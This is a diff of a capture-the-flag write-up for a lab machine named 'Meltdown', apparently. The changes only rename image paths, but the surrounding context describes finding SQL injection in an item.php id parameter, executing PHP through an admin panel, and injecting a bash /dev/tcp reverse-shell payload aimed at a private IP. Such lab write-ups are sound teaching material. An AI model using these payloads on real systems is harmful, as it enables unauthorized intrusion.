@@ -101,7 +101,7 @@ Key endpoints discovered: `index.php`, `login.php`, `item.php`, and `config.php`
 
 Accessing the main index page revealed a Vocaloid-themed application with Chinese text:
 
-![](machines/Meltdown/image.png)
+![](images/img.png)
 
 The page displays "炉心融解" (The core of the furnace melts) and shows a list of items including characters like "Hatsune Miku", "Kagamine Rin", and "Kagamine Ren". A login prompt indicates authentication is required for additional features.
 
@@ -109,7 +109,7 @@ The page displays "炉心融解" (The core of the furnace melts) and shows a lis
 
 The login page requires credentials to access the system:
 
-![](image-1.png)
+![](images/img-1.png)
 
 The login form shows username and password fields with Chinese text, indicating a need to discover valid credentials through other means.
 
@@ -117,11 +117,11 @@ The login form shows username and password fields with Chinese text, indicating 
 
 Testing the `item.php` endpoint without parameters showed an error:
 
-![](image-2.png)
+![](images/img-2.png)
 
 The error message "Warning: Undefined array key 'id'" suggested the presence of an `id` parameter. Testing `item.php?id=1` revealed item details:
 
-![](image-3.png)
+![](images/img-3.png)
 
 The page shows an item description with both Chinese and English text: "This is an item about the melting of the furnace core."
 
@@ -129,7 +129,7 @@ The page shows an item description with both Chinese and English text: "This is 
 
 Testing for SQL injection by adding a single quote to the URL (`item.php?id=1'`) triggered a SQL error:
 
-![](image-4.png)
+![](images/img-4.png)
 
 The MySQL error confirmed the presence of a SQL injection vulnerability in the `id` parameter.
 
@@ -276,7 +276,7 @@ Successfully obtained credentials: `rin:[REDACTED]`
 
 Using the extracted credentials to login:
 
-![](image-5.png)
+![](images/img-5.png)
 
 Successful authentication revealed a welcome message and access to a new endpoint: "Item Introduction Management Panel" at `/rin_profile.php`.
 
@@ -288,7 +288,7 @@ Successful authentication revealed a welcome message and access to a new endpoin
 
 Accessing the admin panel revealed an item description management interface:
 
-![](image-6.png)
+![](images/img-6.png)
 
 The panel allows editing item descriptions with a text area, suggesting potential for command execution. Let's test it using `echo system('id');`
 
@@ -296,7 +296,7 @@ The panel allows editing item descriptions with a text area, suggesting potentia
 
 Testing command execution by updating the description field and observing the results:
 
-![](image-7.png)
+![](images/img-7.png)
 
 The output shows `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, confirming successful remote code execution as the www-data user.
 
@@ -304,7 +304,7 @@ The output shows `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, confir
 
 Injecting a reverse shell payload through the admin panel:
 
-![](image-8.png)
+![](images/img-8.png)
 
 The payload `system("bash -c "bash -i > & /dev/tcp/192.168.100.1/4444 0> &1");` was successfully injected into the item description.
 
